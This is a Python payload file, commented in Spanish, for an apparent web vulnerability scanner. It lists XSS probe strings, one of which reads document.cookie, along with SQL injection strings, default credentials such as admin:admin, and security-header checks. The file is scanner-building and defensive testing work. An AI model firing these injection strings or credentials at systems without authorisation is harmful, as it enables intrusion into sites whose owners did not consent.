"""Payloas centralizados para todos los escáneres de vulnerabilidades.

Todos los vectores de ataque están organizados por categoría
para evitar hardcodear payloads en los módulos de escaneo.
"""

# Payloads para XSS (Cross-Site Scripting)
XSS_PAYLOADS = [
    # Reflected XSS
    {"type": "reflected", "value": "<script>alert('XSS')</script>"},
    {"type": "reflected", "value": "<img src=x onerror=alert('XSS')>"},
    {"type": "reflected", "value": "<svg/onload=alert('XSS')>"},
    {"type": "reflected", "value": "javascript:alert('XSS')"},
    {"type": "reflected", "value": "<body onload=alert('XSS')>"},
    
    # Stored XSS
    {"type": "stored", "value": "<script>alert('Stored XSS')</script>"},
    {"type": "stored", "value": "<img src=x onerror=alert('Stored XSS')>"},
    
    # DOM-based XSS
    {"type": "dom", "value": "#<script>alert('DOM XSS')</script>"},
    {"type": "dom", "value": "javascript:alert(document.cookie)"},
]

# Payloads para SQL Injection
SQLI_PAYLOADS = [
    # Error-based
    {"type": "error_based", "value": "' OR '1'='1"},
    {"type": "error_based", "value": "' OR 1=1--"},
    {"type": "error_based", "value": "\" OR \"1\"=\"1"},
    {"type": "error_based", "value": "admin' --"},
    {"type": "error_based", "value": "admin' #"},
    
    # Boolean-based
    {"type": "boolean_based", "value": "' AND 1=1--"},
    {"type": "boolean_based", "value": "' AND 1=2--"},
    {"type": "boolean_based", "value": "\" AND \"1\"=\"1"},
    
    # Time-based (futuro)
    {"type": "time_based", "value": "'; WAITFOR DELAY '00:00:05'--"},
]

# Headers de seguridad a verificar
HEADERS_CHECKS = [
    {
        "header": "Strict-Transport-Security",
        "recommendation": "max-age=31536000; includeSubDomains",
        "severity": "MEDIUM"
    },
    {
        "header": "X-Content-Type-Options",
        "recommendation": "nosniff",
        "severity": "LOW"
    },
    {
        "header": "X-Frame-Options",
        "recommendation": "DENY o SAMEORIGIN",
        "severity": "MEDIUM"
    },
    {
        "header": "Content-Security-Policy",
        "recommendation": "default-src 'self'",
        "severity": "HIGH"
    },
    {
        "header": "X-XSS-Protection",
        "recommendation": "1; mode=block",
        "severity": "LOW"
    },
    {
        "header": "Referrer-Policy",
        "recommendation": "strict-origin-when-cross-origin",
        "severity": "LOW"
    },
]

# Payloads para futuros escáneres
AUTH_PAYLOADS = [
    {"type": "weak_password", "value": "password123"},
    {"type": "weak_password", "value": "123456"},
    {"type": "default_creds", "value": "admin:admin"},
]

COMPONENTS_PAYLOADS = [
    {"type": "outdated_js", "description": "jQuery 1.x, Angular 1.x, etc."},
    {"type": "vulnerable_cdn", "description": "Bootstrap, React, etc. outdated"},
]

ACCESS_CONTROL_PAYLOADS = [
    {"type": "idor", "description": "Cambio de ID en URL (ej: /user/1 -> /user/2)"},
    {"type": "privilege_escalation", "description": "Acceso a rutas admin sin permisos"},
    {"type": "forceful_browsing", "description": "Saltos de flujo (ej: ir a /checkout sin pasar por /cart)"},
]

ACCESS_CONTROL_PAYLOADS = [
    {"type": "idor", "description": "Cambio de IDs en URL"},
    {"type": "privilege_escalation", "description": "Modificar rol en parámetros"},
]

# Payloads para A02 - Cryptographic Failures
CRYPTO_PAYLOADS = [
    {"type": "https_missing", "description": "El sitio no usa HTTPS"},
    {"type": "cookie_secure_missing", "description": "Cookies sin flag Secure"},
    {"type": "sensitive_in_url", "description": "Credenciales o tokens en la URL"},
    {"type": "weak_tls", "description": "Uso de TLS obsoleto (SSLv3, TLS 1.0/1.1)"},
]
